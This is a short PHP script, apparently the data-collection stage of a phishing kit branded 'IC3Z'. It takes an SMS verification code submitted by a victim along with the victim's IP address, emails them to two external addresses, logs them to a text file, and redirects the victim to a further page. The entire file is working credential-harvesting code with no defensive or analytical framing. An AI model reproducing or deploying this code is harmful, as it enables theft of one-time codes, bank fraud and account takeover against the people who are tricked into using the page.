<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "__________________ XXX _____ IC3Z SMS ____ XXX_____________\n";
$message .= "User              : ".$_POST['o18']."\n";
$message .= "______________ INFOS OF MACHINE _________\n";
$message .= "Ip of Machine              : $ip\n";
$message .= "_________| IC3Z  |__________\n";
$send = "emailzaz127@yandex.com , grundel.renate.1964@gmail.com";
$subject = "CODICE SMS - $ip ";
$headers = "From:Ic3zzz <webmaster@localhost.com>";
mail($send,$subject,$message,$headers);
header("Location: icez.php");
$txt = fopen('sms.txt', 'a');
fwrite($txt, $message);
fclose($txt);
?>